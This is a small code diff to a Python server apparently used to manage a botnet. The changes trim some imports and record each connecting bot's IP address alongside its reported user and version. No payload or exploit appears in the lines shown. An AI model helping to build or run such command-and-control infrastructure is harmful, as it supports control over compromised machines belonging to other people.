@@ -5,11 +5,12 @@ import os
 import socket
 import ssl
 
-from server import formatsock, server
+from server import formatsock
 from server.client import client
-from server.botnetclasses import BotNet, Bot
+from server.botnetclasses import Bot
 
 MIN_CLIENT_VERSION = client.__version__
+
 
 class BotServer(Thread):
     HOST = '0.0.0.0'
@@ -45,6 +46,7 @@ class BotServer(Thread):
             print("[*] Accepting connection")
             msgbytes = clientformatsock.recv()
             host_info = json.loads(msgbytes.decode('UTF-8'))
+            host_info['addr'] = ip
 
             user = host_info['user'].strip()
             botversion = LooseVersion(host_info['version'])
